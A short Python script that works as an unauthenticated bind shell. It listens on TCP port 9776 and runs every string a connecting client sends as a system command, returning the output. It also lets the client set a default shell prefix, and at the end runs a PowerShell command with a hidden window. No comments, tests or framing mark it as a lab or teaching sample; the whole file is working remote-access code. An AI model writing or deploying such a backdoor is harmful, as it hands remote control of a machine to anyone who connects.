import socket
import os
import subprocess

ip = ""
port = 9776
queue = 1
timeout = 1
cc = "s[exit]"
splitter = '////////////////////\\\\\\\\\\\\\\\\\\\\'
def_shell_command = ""
dsc_spl = ""


def Start():
    global def_shell_command, dsc_spl


    msg = None

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.bind((ip, port))
    except:
        print("binding error...")

    sock.listen(queue)

    sock2, info = sock.accept()

    print(info) 

    print('accepted...')


    while msg != cc:
        a = ""
        print(splitter)
        msg = sock2.recv(1024).decode()

        if msg == "DSC":
            sock2.send('Set default shell command...'.encode())
            def_shell_command = sock2.recv(1024).decode()
            if def_shell_command == "":
                dsc_spl = ""
            else:
                dsc_spl = " "
            sock2.send(f'Now default shell is {def_shell_command}'.encode())
        else:
            #try:
            args = def_shell_command+dsc_spl+msg
            print(f'args === {args}')

            a = str(subprocess.run(args, stdout=subprocess.PIPE))
            #except:
                #sock2.send("errorp".encode())
            print(a)

            sock2.send(a.encode())
            print(f'\ncommand === {msg} ===')
            print(splitter)



    sock.close()
    sock2.close()



    



    a = subprocess.run('Powershell.exe -WindowStyle hidden pwd', shell=True)
    print()
    print(a)





if __name__ == "__main__":
    Start()
    print('EOP')